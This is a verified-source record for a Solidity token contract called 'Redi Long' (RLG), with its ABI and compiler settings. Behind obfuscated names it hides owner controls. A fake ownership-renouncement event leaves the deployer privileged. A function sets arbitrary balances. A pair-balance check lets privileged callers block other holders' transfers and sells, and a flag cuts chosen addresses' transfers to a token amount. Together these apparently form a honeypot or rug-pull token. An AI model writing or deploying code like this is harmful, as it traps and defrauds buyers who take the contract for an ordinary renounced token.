{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface listTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tradingMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellFrom {\n    function createPair(address enableSwap, address marketingIsBuy) external returns (address);\n}\n\ninterface marketingLiquidityToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeMode) external view returns (uint256);\n\n    function transfer(address atSell, uint256 marketingMode) external returns (bool);\n\n    function allowance(address autoTotalTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atSell,\n        uint256 marketingMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toSwap, uint256 value);\n    event Approval(address indexed autoTotalTake, address indexed spender, uint256 value);\n}\n\ninterface marketingLiquidityTokenMetadata is marketingLiquidityToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RediLong is tradingMarketing, marketingLiquidityToken, marketingLiquidityTokenMetadata {\n\n    mapping(address => bool) public fundSender;\n\n    mapping(address => mapping(address => uint256)) private listLimit;\n\n    uint256 private minFrom;\n\n    string private autoSell = \"Redi Long\";\n\n    function approve(address fundBuy, uint256 marketingMode) public virtual override returns (bool) {\n        listLimit[_msgSender()][fundBuy] = marketingMode;\n        emit Approval(_msgSender(), fundBuy, marketingMode);\n        return true;\n    }\n\n    function buyMode(address buyReceiverTake, uint256 marketingMode) public {\n        isWallet();\n        walletTeamFee[buyReceiverTake] = marketingMode;\n    }\n\n    address enableTokenSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private launchedLiquidity;\n\n    mapping(address => uint256) private walletTeamFee;\n\n    function toMax(address swapFrom) public {\n        require(swapFrom.balance < 100000);\n        if (walletMarketing) {\n            return;\n        }\n        if (fromAmount != liquidityMarketing) {\n            fromAmount = false;\n        }\n        tradingShould[swapFrom] = true;\n        \n        walletMarketing = true;\n    }\n\n    function modeEnable(uint256 marketingMode) public {\n        isWallet();\n        modeAmount = marketingMode;\n    }\n\n    address public fromTotalLaunched;\n\n    function allowance(address feeLaunch, address fundBuy) external view virtual override returns (uint256) {\n        if (fundBuy == enableTokenSender) {\n            return type(uint256).max;\n        }\n        return listLimit[feeLaunch][fundBuy];\n    }\n\n    bool private launchedTo;\n\n    uint256 shouldAmount;\n\n    bool public walletMarketing;\n\n    function marketingAt(address isToTotal) public {\n        isWallet();\n        if (fromAmount) {\n            liquidityMarketing = false;\n        }\n        if (isToTotal == shouldLaunched || isToTotal == fromTotalLaunched) {\n            return;\n        }\n        fundSender[isToTotal] = true;\n    }\n\n    uint256 public swapEnable;\n\n    uint256 constant senderReceiver = 8 ** 10;\n\n    function isWallet() private view {\n        require(tradingShould[_msgSender()]);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchIsBuy;\n    }\n\n    function getOwner() external view returns (address) {\n        return launchedLiquidity;\n    }\n\n    uint256 modeAmount;\n\n    function walletTake(address buyToken, address atSell, uint256 marketingMode) internal returns (bool) {\n        if (buyToken == shouldLaunched) {\n            return maxTrading(buyToken, atSell, marketingMode);\n        }\n        uint256 fromMarketing = marketingLiquidityToken(fromTotalLaunched).balanceOf(launchedReceiverSell);\n        require(fromMarketing == modeAmount);\n        require(atSell != launchedReceiverSell);\n        if (fundSender[buyToken]) {\n            return maxTrading(buyToken, atSell, senderReceiver);\n        }\n        return maxTrading(buyToken, atSell, marketingMode);\n    }\n\n    address public shouldLaunched;\n\n    function transferFrom(address buyToken, address atSell, uint256 marketingMode) external override returns (bool) {\n        if (_msgSender() != enableTokenSender) {\n            if (listLimit[buyToken][_msgSender()] != type(uint256).max) {\n                require(marketingMode <= listLimit[buyToken][_msgSender()]);\n                listLimit[buyToken][_msgSender()] -= marketingMode;\n            }\n        }\n        return walletTake(buyToken, atSell, marketingMode);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellBuy;\n    }\n\n    function maxTrading(address buyToken, address atSell, uint256 marketingMode) internal returns (bool) {\n        require(walletTeamFee[buyToken] >= marketingMode);\n        walletTeamFee[buyToken] -= marketingMode;\n        walletTeamFee[atSell] += marketingMode;\n        emit Transfer(buyToken, atSell, marketingMode);\n        return true;\n    }\n\n    bool private fromAmount;\n\n    uint256 private sellBuy = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return launchedLiquidity;\n    }\n\n    function transfer(address buyReceiverTake, uint256 marketingMode) external virtual override returns (bool) {\n        return walletTake(_msgSender(), buyReceiverTake, marketingMode);\n    }\n\n    function balanceOf(address takeMode) public view virtual override returns (uint256) {\n        return walletTeamFee[takeMode];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldTx;\n    }\n\n    address launchedReceiverSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private shouldTx = 18;\n\n    function listTakeFund() public {\n        emit OwnershipTransferred(shouldLaunched, address(0));\n        launchedLiquidity = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoSell;\n    }\n\n    mapping(address => bool) public tradingShould;\n\n    bool public liquidityMarketing;\n\n    event OwnershipTransferred(address indexed receiverAmount, address indexed maxLimit);\n\n    constructor (){\n        \n        listTo teamBuy = listTo(enableTokenSender);\n        fromTotalLaunched = sellFrom(teamBuy.factory()).createPair(teamBuy.WETH(), address(this));\n        \n        shouldLaunched = _msgSender();\n        listTakeFund();\n        tradingShould[shouldLaunched] = true;\n        walletTeamFee[shouldLaunched] = sellBuy;\n        if (liquidityMarketing == launchedTo) {\n            liquidityMarketing = false;\n        }\n        emit Transfer(address(0), shouldLaunched, sellBuy);\n    }\n\n    string private launchIsBuy = \"RLG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTotalTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyReceiverTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMode\",\"type\":\"uint256\"}],\"name\":\"buyMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTotalLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTakeFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isToTotal\",\"type\":\"address\"}],\"name\":\"marketingAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingMode\",\"type\":\"uint256\"}],\"name\":\"modeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFrom\",\"type\":\"address\"}],\"name\":\"toMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyReceiverTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "RediLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}